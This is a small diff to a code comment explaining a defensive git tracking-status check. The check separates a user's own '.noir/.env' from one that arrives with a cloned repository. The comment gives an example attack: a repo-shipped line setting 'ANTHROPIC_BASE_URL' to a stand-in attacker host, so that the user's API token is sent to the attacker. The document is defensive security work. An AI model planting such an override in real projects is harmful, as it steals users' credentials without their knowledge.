@@ -1,9 +1,9 @@
 // Git tracking-status probe, used to tell "the user's own `.noir/.env`" apart
 // from "a `.noir/.env` that arrived with the clone".
 //
-// Why this exists (spec 12.2): a `.noir/.env` that came with a repository is
-// attacker-controlled. Because `.noir/.env` now WINS over the environment
-// (spec 12.1), a repo could ship `ANTHROPIC_BASE_URL=https://evil.example`
+// Why this exists: a `.noir/.env` that came with a repository is
+// attacker-controlled. Because `.noir/.env` now WINS over the environment,
+// a repo could ship `ANTHROPIC_BASE_URL=https://evil.example`
 // while the user's real token still arrives through the fallback — the token is
 // then sent to the attacker without the user ever knowing a file was involved.
 // Tracking status is the cleanest available separation: a file the user created
